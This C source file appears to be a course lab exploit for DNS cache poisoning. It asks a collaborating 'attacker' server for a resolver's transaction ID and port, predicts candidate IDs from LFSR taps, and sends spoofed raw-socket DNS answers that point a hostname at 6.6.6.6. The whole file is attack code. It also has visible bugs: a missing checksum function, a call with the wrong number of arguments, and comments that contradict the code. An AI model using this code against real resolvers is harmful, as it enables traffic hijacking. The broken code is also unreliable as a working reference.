#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>

#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/in.h>


#define DNS_SERVER_IP "192.168.1.203" // Google's public DNS server
#define DNS_SERVER_PORT 53      // Standard DNS port
#define BUFFER_SIZE 512         // Buffer size for the DNS query and response
#define INFO_SERVER_IP "192.168.1.201" // Server providing initial information
#define INFO_SERVER_PORT 4444          // Port for receiving info
#define TAP1 0x80000057
#define TAP2 0x80000062

// Pseudo header needed for UDP checksum calculation
struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t udp_length;
};

// Function to build DNS response
int build_dns_response(unsigned char *buffer, unsigned char *query, int query_len, uint32_t txid) {
    int response_len = 0;
    unsigned short type = htons(1);  // Type A (IPv4 address)
    unsigned short _class = htons(1); // Class IN (Internet)
    unsigned int ttl = htonl(3000);    // Time-to-live: 300 seconds
    unsigned short data_len = htons(4); // Length of the IP address

    // A record data (IP address 6.6.6.6)
    unsigned char ip_address[] = { 6, 6, 6, 6 };

    // Copy query into buffer
    memcpy(buffer, query, query_len);
    response_len = query_len;

    // DNS Header (response)
    uint32_t txid_network = htons(txid);
    unsigned short flags = htons(0x8180);  // Standard query response, no error
    unsigned short q_count = htons(1);     // 1 question
    unsigned short ans_count = htons(1);   // 1 answer
    unsigned short auth_count = 0;
    unsigned short add_count = 0;

    // Header section for response
    memcpy(buffer + response_len, &txid_network, 2);
    response_len += 2;
    memcpy(buffer + response_len, &flags, 2);
    response_len += 2;
    memcpy(buffer + response_len, &q_count, 2);
    response_len += 2;
    memcpy(buffer + response_len, &ans_count, 2);
    response_len += 2;
    memcpy(buffer + response_len, &auth_count, 2);
    response_len += 2;
    memcpy(buffer + response_len, &add_count, 2);
    response_len += 2;

    // Copy question section
    memcpy(buffer + response_len, (query + 12), query_len - 12);
    response_len += query_len - 12;

    // Answer section
    memcpy(buffer + response_len, &type, 2);
    response_len += 2;
    memcpy(buffer + response_len, &_class, 2);
    response_len += 2;
    memcpy(buffer + response_len, &ttl, 4);
    response_len += 4;
    memcpy(buffer + response_len, &data_len, 2);
    response_len += 2;
    memcpy(buffer + response_len, ip_address, 4);
    response_len += 4;

    return response_len;
}

// Function to send a spoofed DNS response using raw sockets
void send_spoofed_dns_response(const char *hostname, uint32_t txid, const char *destination_ip, int destination_port, uint32_t source_ip) {
    int sockfd;
    unsigned char buffer[BUFFER_SIZE];

    // Step 1: Create a raw socket
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Pseudo header for checksum calculation
    struct pseudo_header psh;
    psh.source_address = inet_addr("192.168.1.204");  // Spoofed source IP
    psh.dest_address = inet_addr(destination_ip);  // Target DNS server IP
    psh.placeholder = 0;
    psh.protocol = IPPROTO_UDP;
    psh.udp_length = htons(8 + sizeof(struct udphdr) + 4); // UDP header + DNS response size

    // Build DNS query
    unsigned char query[BUFFER_SIZE];
    int query_len = build_dns_response(buffer, query, sizeof(query), txid);

    // Build UDP header
    struct udphdr udp_header;
    udp_header.source = htons(0); // Source port (can be random)
    udp_header.dest = htons(destination_port); // Destination DNS port
    udp_header.len = htons(sizeof(struct udphdr) + query_len); // UDP length
    udp_header.check = 0; // Initially 0 for checksum calculation

    // Calculate UDP checksum
    int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + query_len;
    unsigned char *pseudogram = (unsigned char *)malloc(psize);

    memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), (char *)&udp_header, sizeof(struct udphdr));
    memcpy(pseudogram + sizeof(struct pseudo_header) + sizeof(struct udphdr), buffer, query_len);

    udp_header.check = checksum((unsigned short *)pseudogram, psize);  // UDP checksum calculation

    // Step 2: Build the final packet with IP and UDP headers
    struct iphdr ip_header;
    ip_header.ihl = 5; // IP header length
    ip_header.version = 4; // IPv4
    ip_header.tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + query_len);
    ip_header.id = htonl(54321); // Packet ID
    ip_header.frag_off = 0;
    ip_header.ttl = 255; // TTL (Time-to-Live)
    ip_header.protocol = IPPROTO_UDP;
    ip_header.check = 0; // Initially 0 for checksum calculation
    ip_header.saddr = source_ip; // Spoofed source IP
    ip_header.daddr = inet_addr(destination_ip); // Target DNS server IP

    // Calculate IP checksum
    ip_header.check = checksum((unsigned short *)&ip_header, sizeof(struct iphdr));

    // Step 3: Send the crafted packet
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(destination_port);
    dest.sin_addr.s_addr = inet_addr(destination_ip);

    // Send the raw packet
    unsigned char packet[4096];
    memcpy(packet, &ip_header, sizeof(struct iphdr));
    memcpy(packet + sizeof(struct iphdr), &udp_header, sizeof(struct udphdr));
    memcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr), buffer, query_len);

    if (sendto(sockfd, packet, ip_header.tot_len, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
        perror("Failed to send spoofed DNS response");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("Spoofed DNS response sent with source IP: %s\n", inet_ntoa(*(struct in_addr *)&source_ip));

    close(sockfd);
}

// Function to fill the txid_ls with the 10 possible txid
void fill_txids(uint32_t *txid_ls, uint32_t txid){
    // if the LSbit of r_1 = LSbit r_2 = 0 
    txid_ls[8] = txid >> 1;
    // set the left most bit of txid_ls[0] to 1, txid is 16 bits
    txid_ls[9] = (txid >> 1) | 0x8000;

    // else if the LSbit of r_1 = LSbit r_2 = 1
    for (int i = 0; i < 4; i ++) {
        txid_ls[i] = ((((txid >> 1) ^ TAP1 ^ TAP2) >> 1) ^ TAP1 ^ TAP2) | (14<<i);
    }
    
    for (int i = 0; i < 4; i ++) {
        txid_ls[4 + i] = (((txid >> 1) ^ TAP1 ^ TAP2) >> 1) | (14<<i);
    }
}
    
int socket_creation(struct sockaddr_in *server_addr){
    // Create a socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Configure the server address
    printf("configure the server address \n");
    memset(server_addr, 0, sizeof(*server_addr));
    (*server_addr).sin_family = AF_INET;
    (*server_addr).sin_port = htons(INFO_SERVER_PORT);
    inet_pton(AF_INET, INFO_SERVER_IP, &server_addr->sin_addr);

    // Connect to the server
    printf("connect to the server\n");
    if (connect(sockfd, (struct sockaddr *)server_addr, sizeof(*server_addr)) < 0) {
        perror("Connection to info server failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    return sockfd;
}

// Function to communicate with the info server and get the txid
void run_attack(uint32_t *txid_ls) {
    // connect to server attacker
    int sockfd1;
    struct sockaddr_in server_addr1;
    char txid_buffer[BUFFER_SIZE];
    uint32_t txid = 0;
    unsigned int source_port = 0;

    sockfd1 = socket_creation(&server_addr1);
    
    printf("Attacker server connected: %s:%d\n", inet_ntoa(server_addr1.sin_addr), ntohs(server_addr1.sin_port));
    
    // send the DNS request  ################ step 1 #####################
    const char *hostname = "www.attacker.cybercourse.com";
    int sockfd;
    struct sockaddr_in server_addr;
    unsigned char buffer[BUFFER_SIZE];

    // Step 1: Create a UDP socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }
    // Step 2: Configure the DNS server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(DNS_SERVER_PORT);
    inet_pton(AF_INET, DNS_SERVER_IP, &server_addr.sin_addr);
    printf("step 2 done\n");
    // Step 3: Build the DNS query
    int query_len = build_dns_query(buffer, hostname, 1234);
    printf("step 3 done\n");
    printf("buffer: %s\n", buffer);
    // Step 4: Send the DNS query
    if (sendto(sockfd, buffer, query_len, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Failed to send DNS query");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("DNS query sent for hostname: %s\n", hostname);
    printf("waiting for txid\n");
    // Receive the txid from the server
    int bytes_received = recv(sockfd1, txid_buffer, BUFFER_SIZE - 1, 0); // fix this
    if (bytes_received < 0) {
        perror("Failed to receive data from info server");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    txid_buffer[bytes_received] = '\0'; // Null-terminate the received string
    printf("Received from server: %s\n", txid_buffer);

    // Parse the txid
    if (sscanf(txid_buffer, "TXID: %u, PORT: %u", &txid, &source_port) != 2) {
        fprintf(stderr, "Failed to parse TXID from server response\n");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("Extracted TXID: %u\n", txid);
    printf("source port : %u\n", source_port);
    fill_txids(txid_ls, txid);
    for (int i = 0; i < 10; i++) {
        send_spoofed_dns_response("www.example.cybercourse.com", txid_ls[i], DNS_SERVER_IP, source_port, txid_ls[i], inet_addr("192.168.1.204"));
        printf("sent spoofed response %d with txid %u\n", i, txid_ls[i]);
    }
    
    // Close the connection
    close(sockfd);
    close(sockfd1);
}


// Function to build a DNS query
int build_dns_query(unsigned char *buffer, const char *hostname, uint32_t tid) {
    int query_len = 0;
    uint32_t txid = htons(tid); // Transaction ID
    unsigned short flags = htons(0x0100); // Standard query
    unsigned short q_count = htons(1);   // 1 question
    unsigned short ans_count = 0;        // No answers
    unsigned short auth_count = 0;       // No authority
    unsigned short add_count = 0;        // No additional

    // Header section
    memcpy(buffer + query_len, &txid, 2);
    query_len += 2;
    memcpy(buffer + query_len, &flags, 2);
    query_len += 2;
    memcpy(buffer + query_len, &q_count, 2);
    query_len += 2;
    memcpy(buffer + query_len, &ans_count, 2);
    query_len += 2;
    memcpy(buffer + query_len, &auth_count, 2);
    query_len += 2;
    memcpy(buffer + query_len, &add_count, 2);
    query_len += 2;
    printf("got here \n");
    // Question section (convert hostname to DNS format)
    char buffer2[512];
    strcpy(buffer2, hostname);
    const char *token = strtok((char *)buffer2, ".");
    printf("got here \n");
    while (token) {
        size_t len = strlen(token);
        buffer[query_len++] = (unsigned char)len;
        memcpy(buffer + query_len, token, len);
        query_len += len;
        token = strtok(NULL, ".");
    }

    buffer[query_len++] = 0; // End of hostname

    // Question Type (A record)
    unsigned short qtype = htons(1); // Type A
    memcpy(buffer + query_len, &qtype, 2);
    query_len += 2;

    // Question Class (IN)
    unsigned short qclass = htons(1); // Class IN
    memcpy(buffer + query_len, &qclass, 2);
    query_len += 2;

    return query_len;
}

int main() {
    uint32_t txid[10];

    // Step 1: Get the TXID from the info server
    run_attack(txid);


    return 0;
}

